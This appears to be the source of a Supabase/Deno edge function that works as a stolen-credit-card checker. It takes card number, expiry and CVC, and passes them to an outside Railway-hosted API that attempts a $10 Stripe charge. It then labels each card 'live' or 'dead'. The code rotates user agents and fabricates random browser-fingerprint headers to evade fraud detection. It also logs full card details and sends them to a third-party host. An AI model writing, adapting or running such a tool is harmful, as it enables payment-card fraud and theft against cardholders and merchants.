import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

// API Configuration
const API_BASE_URL = "https://web-production-7ad4f.up.railway.app/api";

// Rotating User Agents
const userAgents = [
  // Chrome Windows
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  // Chrome Mac
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  // Firefox Windows
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
  // Firefox Mac
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
  // Safari
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  // Edge
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
  // Chrome Linux
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
];

// Browser fingerprint components
const screenResolutions = ['1920x1080', '2560x1440', '1366x768', '1536x864', '1440x900', '1280x720', '3840x2160'];
const colorDepths = ['24', '32', '30'];
const timezones = ['-480', '-420', '-360', '-300', '-240', '0', '60', '120', '180', '330', '480', '540'];
const languages = ['en-US', 'en-GB', 'en-CA', 'en-AU', 'es-ES', 'fr-FR', 'de-DE', 'pt-BR', 'it-IT'];
const platforms = ['Win32', 'MacIntel', 'Linux x86_64'];
const cpuCores = ['4', '6', '8', '12', '16'];
const memoryGB = ['4', '8', '16', '32'];
const touchPoints = ['0', '1', '5', '10'];

const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];

const generateFingerprint = () => {
  const resolution = getRandomItem(screenResolutions).split('x');
  return {
    screenWidth: resolution[0],
    screenHeight: resolution[1],
    colorDepth: getRandomItem(colorDepths),
    timezone: getRandomItem(timezones),
    language: getRandomItem(languages),
    platform: getRandomItem(platforms),
    cpuCores: getRandomItem(cpuCores),
    memory: getRandomItem(memoryGB),
    touchPoints: getRandomItem(touchPoints),
  };
};

// Direct API call - no retries, immediate response
const callApi = async (cc: string): Promise<{ status: string; message: string; rawResponse: string }> => {
  const apiUrl = `${API_BASE_URL}?cc=${cc}`;
  const userAgent = getRandomItem(userAgents);
  const fingerprint = generateFingerprint();
  
  console.log(`[STRIPE-CHARGE] Calling: ${apiUrl}`);
  
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 55000);
  
  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: { 
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': fingerprint.language,
        'Accept-Encoding': 'gzip, deflate, br',
        'User-Agent': userAgent,
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': `"${fingerprint.platform === 'Win32' ? 'Windows' : fingerprint.platform === 'MacIntel' ? 'macOS' : 'Linux'}"`,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'X-Screen-Width': fingerprint.screenWidth,
        'X-Screen-Height': fingerprint.screenHeight,
        'X-Color-Depth': fingerprint.colorDepth,
        'X-Timezone-Offset': fingerprint.timezone,
        'X-Hardware-Concurrency': fingerprint.cpuCores,
        'X-Device-Memory': fingerprint.memory,
        'X-Touch-Points': fingerprint.touchPoints,
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    console.log(`[STRIPE-CHARGE] Response: ${rawText}`);
    
    if (!rawText || rawText.trim() === '') {
      return { status: 'unknown', message: 'Empty response', rawResponse: '' };
    }
    
    let apiStatus = 'unknown';
    let apiMessage = rawText;
    
    try {
      const json = JSON.parse(rawText);
      apiMessage = json.message || json.msg || rawText;
      
      // Direct status mapping
      if (json.full_response === true || json.status === 'CHARGED' || json.status === 'success') {
        apiStatus = 'live';
      } else if (json.full_response === false || json.status === 'DECLINED' || json.status === 'failed' || json.status === 'error') {
        apiStatus = 'dead';
      } else {
        // Keyword detection
        const lower = String(apiMessage).toLowerCase();
        if (lower.includes('success') || lower.includes('charged') || lower.includes('approved')) {
          apiStatus = 'live';
        } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || 
                   lower.includes('insufficient') || lower.includes('card_declined') || lower.includes('incorrect') ||
                   lower.includes('do_not_honor') || lower.includes('fraud') || lower.includes('error')) {
          apiStatus = 'dead';
        }
      }
    } catch {
      // Text response
      const lower = rawText.toLowerCase();
      if (lower.includes('charged') || lower.includes('success')) apiStatus = 'live';
      else if (lower.includes('declined') || lower.includes('error')) apiStatus = 'dead';
    }
    
    return { status: apiStatus, message: apiMessage, rawResponse: rawText };
    
  } catch (error) {
    clearTimeout(timeoutId);
    const errMsg = error instanceof Error ? error.message : 'Error';
    console.error(`[STRIPE-CHARGE] Error: ${errMsg}`);
    return { status: 'unknown', message: 'Timeout', rawResponse: errMsg };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Parse body first (faster than waiting for auth)
    const body = await req.json();
    const { cc } = body;
    
    if (!cc) {
      return new Response(JSON.stringify({ error: 'Card required', computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Quick format validation
    const parts = cc.split('|');
    if (parts.length < 4 || !parts[3] || parts[3].length < 3 || !/^\d+$/.test(parts[3])) {
      return new Response(JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Start API call immediately while auth happens
    const apiPromise = callApi(cc);

    // Auth check in parallel
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Ban check
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }), 
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Wait for API result
    const result = await apiPromise;
    
    return new Response(
      JSON.stringify({
        computedStatus: result.status,
        apiStatus: result.status === 'live' ? 'CHARGED' : result.status === 'dead' ? 'DECLINED' : 'UNKNOWN',
        apiMessage: result.message,
        apiTotal: '$10.00',
        status: result.status,
        message: result.message,
        rawResponse: result.rawResponse,
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    return new Response(JSON.stringify({ error: msg, computedStatus: "unknown" }), 
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
